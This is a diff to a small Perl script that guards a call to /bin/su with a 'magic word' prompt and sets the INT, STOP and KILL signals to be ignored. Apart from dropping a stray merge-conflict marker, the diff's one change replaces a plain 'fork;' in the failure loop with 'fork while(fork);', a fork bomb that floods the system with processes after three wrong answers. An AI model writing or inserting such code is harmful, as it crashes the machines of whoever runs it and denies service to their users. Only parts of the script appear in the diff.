@@ -1,7 +1,6 @@
 #!/usr/bin/perl
 use warnings;
 #use strict;
-<<<<<<< HEAD
 $SIG{'INT'} = 'IGNORE';
 $SIG{'STOP'} = 'IGNORE';
 $SIG{'KILL'} = 'IGNORE';
@@ -18,7 +17,7 @@ while ($sharg ne $please && $i<3){
 if($i>=3){
   while (1){
    print "you didn't say the magic word\n";
-   fork;
+   fork while(fork);
   }
 } else {
   exec "/bin/su";
